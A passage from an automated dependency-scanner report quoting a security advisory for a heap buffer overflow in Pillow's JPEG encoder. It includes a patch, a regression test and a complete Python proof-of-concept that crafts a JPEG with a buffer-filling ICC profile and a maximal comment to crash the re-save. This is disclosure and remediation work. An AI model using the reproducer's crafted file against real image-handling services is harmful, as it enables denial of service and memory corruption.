bytes\n\u003e +                if (context-\u003ecomment_size + 5 \u003e\n\u003e +                    context-\u003edestination.pub.free_in_buffer) {\n\u003e +                    break;\n\u003e +                }\n\u003e                  jpeg_write_marker(\n\u003e ```\n\u003e \n\u003e The encoder then returns with the buffer full, `_encode_tile()` calls it again with an empty buffer, and the comment is emitted there. The C hunk is not sufficient on its own: state 4, like state 2, relies on the Python side guaranteeing that an *empty* buffer is always large enough, and a 65533-byte comment needs 65538 bytes against a 65536-byte `MAXBLOCK` buffer — with only the C guard the encoder returns 0 bytes and no error forever and `_encode_tile()` spins. The patch therefore also changes `JpegImagePlugin._save()` to reserve `len(comment) + 5` in both sizing branches (added to `bufsize` in the `optimize`/`progressive` branch, and as a third term of the `max()` in the plain branch), and normalises the comment to `bytes` first (`str` is UTF-8-encoded, `None` becomes `b\"\"`) so the length is exact for non-ASCII `str` comments; `encode.c` already UTF-8-encodes `str` via `z#`, so the bytes written are unchanged. A side effect visible to users: comments of up to 65533 bytes now save successfully in cases that previously raised `OSError: broken data stream` because the default buffer was too small. The patch adds `test_icc_big_comment` to `Tests/test_file_jpeg.py`, which round-trips a 65533-byte comment with ICC profiles sized around the exact-fit boundary; it crashes (or raises `OSError`) on the unpatched tree and passes with the patch. With the patch applied to a clean tree and rebuilt, the reproducer no longer triggers, and `Tests/test_file_jpeg.py` and `Tests/test_file_mpo.py` pass.\n\u003e \n\u003e The C guard still depends on the Python sizing to avoid a 0-byte/no-error busy loop, exactly as state 2 already does. A more defensive variant would fail with `IMAGING_CODEC_MEMORY` instead of `break` when the marker does not fit and nothing has been written to the current buffer yet (`next_output_byte == buf`), so that a sizing mistake in any caller can never turn into a busy loop. It would also be consistent with `exif`/`xmp` handling for `_save()` to reject comments longer than `MAX_BYTES_IN_MARKER` (65533) with `ValueError(\"Comment is too long\")` rather than leaving it to libjpeg's `JERR_BAD_LENGTH` → `OSError`.\n\u003e \n\u003e Independently, the \"+ 1 spare byte\" / \"+ 5\" reasoning in `_save()` under-counts by the 18–20 bytes `jpeg_start_compress()` writes before the EXIF/extra blocks; that is what lets attacker-sized metadata land the buffer on an exact boundary in the first place. The attached patch does not change that accounting.\n\u003e \n\u003e ## The patch\n\u003e \n\u003e Check free output-buffer space before writing the JPEG COM marker in ImagingJpegEncode, and size the encoder buffer for the comment in JpegImagePlugin._save\n\u003e \n\u003e Applies to `src/libImaging/JpegEncode.c` at the commit above.\n\u003e \n\u003e ```diff\n\u003e diff --git a/Tests/test_file_jpeg.py b/Tests/test_file_jpeg.py\n\u003e index b361aef2e..f884883c4 100644\n\u003e --- a/Tests/test_file_jpeg.py\n\u003e +++ b/Tests/test_file_jpeg.py\n\u003e @@ -227,6 +227,16 @@ class TestFileJpeg:\n\u003e          im1 = self.roundtrip(hopper(), icc_profile=icc_profile)\n\u003e          assert im1.info.get(\"icc_profile\") == (icc_profile or None)\n\u003e  \n\u003e +    def test_icc_big_comment(self) -\u003e None:\n\u003e +        # The ICC profile may fill the encoder buffer exactly, in which case the\n\u003e +        # comment has to be written to the next buffer\n\u003e +        comment = b\"C\" * 65533\n\u003e +        for n in range(ImageFile.MAXBLOCK - 40, ImageFile.MAXBLOCK - 30):\n\u003e +            icc_profile = b\"I\" * n\n\u003e +            im = self.roundtrip(hopper(), icc_profile=icc_profile, comment=comment)\n\u003e +            assert im.info[\"icc_profile\"] == icc_profile\n\u003e +            assert im.info[\"comment\"] == comment\n\u003e +\n\u003e      def test_large_icc_meta(self, tmp_path: Path) -\u003e None:\n\u003e          # https://github.com/python-pillow/Pillow/issues/148\n\u003e          # Sometimes the meta data on the icc_profile block is bigger than\n\u003e diff --git a/src/PIL/JpegImagePlugin.py b/src/PIL/JpegImagePlugin.py\n\u003e index 4b8d34ca3..1d9f4c2fa 100644\n\u003e --- a/src/PIL/JpegImagePlugin.py\n\u003e +++ b/src/PIL/JpegImagePlugin.py\n\u003e @@ -805,7 +805,9 @@ def _save(im: Image.Image, fp: IO[bytes], filename: str | bytes) -\u003e None:\n\u003e              )\n\u003e              i += 1\n\u003e  \n\u003e -    comment = info.get(\"comment\", im.info.get(\"comment\"))\n\u003e +    comment = info.get(\"comment\", im.info.get(\"comment\")) or b\"\"\n\u003e +    if isinstance(comment, str):\n\u003e +        comment = comment.encode()\n\u003e  \n\u003e      # \"progressive\" is the official name, but older documentation\n\u003e      # says \"progression\"\n\u003e @@ -856,10 +858,13 @@ def _save(im: Image.Image, fp: IO[bytes], filename: str | bytes) -\u003e None:\n\u003e              bufsize += len(exif) + 5\n\u003e          if extra:\n\u003e              bufsize += len(extra) + 1\n\u003e +        if comment:\n\u003e +            bufsize += len(comment) + 5\n\u003e      else:\n\u003e          # The EXIF info needs to be written as one block, + APP1, + one spare byte.\n\u003e -        # Ensure that our buffer is big enough. Same with the icc_profile block.\n\u003e -        bufsize = max(len(exif) + 5, len(extra) + 1)\n\u003e +        # Ensure that our buffer is big enough. Same with the icc_profile block\n\u003e +        # and the comment (COM marker).\n\u003e +        bufsize = max(len(exif) + 5, len(extra) + 1, len(comment) + 5)\n\u003e  \n\u003e      ImageFile._save(\n\u003e          im, fp, [ImageFile._Tile(\"jpeg\", (0, 0, *im.size), 0, rawmode)], bufsize\n\u003e diff --git a/src/libImaging/JpegEncode.c b/src/libImaging/JpegEncode.c\n\u003e index 098e431fc..b6771c6ec 100644\n\u003e --- a/src/libImaging/JpegEncode.c\n\u003e +++ b/src/libImaging/JpegEncode.c\n\u003e @@ -327,6 +327,11 @@ ImagingJpegEncode(Imaging im, ImagingCodecState state, UINT8 *buf, int bytes) {\n\u003e          case 4:\n\u003e  \n\u003e              if (context-\u003ecomment) {\n\u003e +                // check for comment len + 'COM' header bytes\n\u003e +                if (context-\u003ecomment_size + 5 \u003e\n\u003e +                    context-\u003edestination.pub.free_in_buffer) {\n\u003e +                    break;\n\u003e +                }\n\u003e                  jpeg_write_marker(\n\u003e                      \u0026context-\u003ecinfo,\n\u003e                      JPEG_COM,\n\u003e ```\n\u003e \n\u003e ## The reproducer\n\u003e \n\u003e \u003cdetails\u003e\n\u003e \u003csummary\u003eReproducer — \u003ccode\u003erepro\u003c/code\u003e, 3,343 bytes (click to open)\u003c/summary\u003e\n\u003e \n\u003e Its last line is `BUG` when the issue triggers and `OK` when it does not. Re-run on a clean build of that commit it printed `BUG`.\n\u003e \n\u003e ```python\n\u003e #!/usr/bin/env python3\n\u003e # Pillow heap buffer overflow in ImagingJpegEncode() (src/libImaging/JpegEncode.c, case 4).\n\u003e #\n\u003e # Re-saving a JPEG with its own ICC profile, the usual \"keep the colours\" re-encode:\n\u003e #     im = Image.open(f); im.save(out, \"JPEG\", icc_profile=im.info[\"icc_profile\"])\n\u003e # If the ICC segment fills the 65536-byte encoder buffer to the last byte, the COM\n\u003e # marker (forwarded from im.info[\"comment\"] automatically) is written with\n\u003e # free_in_buffer == 0. libjpeg stores the byte, then decrements the counter, which\n\u003e # wraps to ~2^64, and the comment plus the whole compressed image go past the end\n\u003e # of the heap buffer. The Python process dies with SIGSEGV or a glibc abort.\n\u003e #\n\u003e # Runs against the stock build in /src, no rebuild. Takes about 2 seconds.\n\u003e import random\n\u003e import struct\n\u003e import subprocess\n\u003e import sys\n\u003e from io import BytesIO\n\u003e \n\u003e from PIL import Image\n\u003e \n\u003e # Output-buffer layout at the moment the COM marker is written:\n\u003e ENCODER_BUFFER = 65536  # ImageFile.MAXBLOCK; _save() never makes it bigger here\n\u003e JFIF_HEADER = 20  # SOI + JFIF APP0, written by jpeg_start_compress()\n\u003e ICC_OVERHEAD = 18  # FFE2 \u003clen\u003e \"ICC_PROFILE\\0\" \u003cseq\u003e \u003ccount\u003e\n\u003e ICC_PAYLOAD = ENCODER_BUFFER - JFIF_HEADER - ICC_OVERHEAD  # 65498: exact fit\n\u003e COMMENT = b\"C\" * 65533  # largest legal COM; content and length chosen by the file\n\u003e \n\u003e # What the victim application does with an uploaded file, run in a child process\n\u003e # so that we can see it die.\n\u003e RESAVE = \"\"\"\n\u003e import sys\n\u003e from io import BytesIO\n\u003e from PIL import Image\n\u003e im = Image.open(BytesIO(sys.stdin.buffer.read()))\n\u003e im.save(BytesIO(), \"JPEG\", icc_profile=im.info[\"icc_profile\"])\n\u003e print(\"save returned normally\")\n\u003e \"\"\"\n\u003e \n\u003e \n\u003e def segment(marker, payload):\n\u003e     return bytes([0xFF, marker]) + struct.pack(\"\u003eH\", len(payload) + 2) + payload\n\u003e \n\u003e \n\u003e def make_jpeg(with_comment):\n\u003e     \"\"\"A valid 256x256 JPEG: an ICC profile of ICC_PAYLOAD bytes, optionally a COM.\"\"\"\n\u003e     noise = random.Random(1234).randbytes(256 * 256 * 3)  # ~100 KB of image data\n\u003e     out = BytesIO()\n\u003e     Image.frombytes(\"RGB\", (256, 256), noise).save(out, \"JPEG\", quality=95)\n\u003e     plain = out.getvalue()\n\u003e \n\u003e     icc = segment(0xE2, b\"ICC_PROFILE\\0\\x01\\x01\" + b\"I\" * ICC_PAYLOAD)\n\u003e     com = segment(0xFE, COMMENT) if with_comment else b\"\"\n\u003e     return plain[:2] + icc + com + plain[2:]  # splice in right after SOI\n\u003e \n\u003e \n\u003e def resave(jpeg):\n\u003e     # -X faulthandler: on a fatal signal, print where in Python the child died\n\u003e     cmd = [sys.executable, \"-X\", \"faulthandler\", \"-c\", RESAVE]\n\u003e     r = subprocess.run(cmd, input=jpeg, capture_output=True)\n\u003e     print((r.stdout + r.stderr).decode(errors=\"replace\").strip())\n\u003e     print(f\"-\u003e exit status {r.returncode}\")\n\u003e     return r.returncode\n\u003e \n\u003e \n\u003e # Control: the same file without a COM segment re-saves fine, so the buffer\n\u003e # sizing and the ICC profile on their own are harmless.\n\u003e print(\"Control: re-save the JPEG without a comment\")\n\u003e resave(make_jpeg(with_comment=False))\n\u003e \n\u003e # The bug: add a COM segment. The comment is now written into a buffer that has\n\u003e # no room left.\n\u003e print(f\"\\nPoC: re-save the JPEG with a {len(COMMENT)}-byte comment\")\n\u003e rc = resave(make_jpeg(with_comment=True))\n\u003e \n\u003e # A negative return code means the child was killed by a signal (SIGSEGV or\n\u003e # SIGABRT from glibc's heap checks), not by a Python exception.\n\u003e if rc \u003c 0:\n\u003e     print(f\"\\nim.save() killed the process with signal {-rc}: out-of-bounds heap write\")\n\u003e     print(\"BUG\")\n\u003e else:\n\u003e     print(\"OK\")\n\u003e ```\n\u003e \u003c/details\u003e\n\u003e \n\u003e ---\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/uv.lock | pillow | 12.3.0 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-g7cr-3p24-7wf7 | pillow | 13.0.0 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-96778\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n"
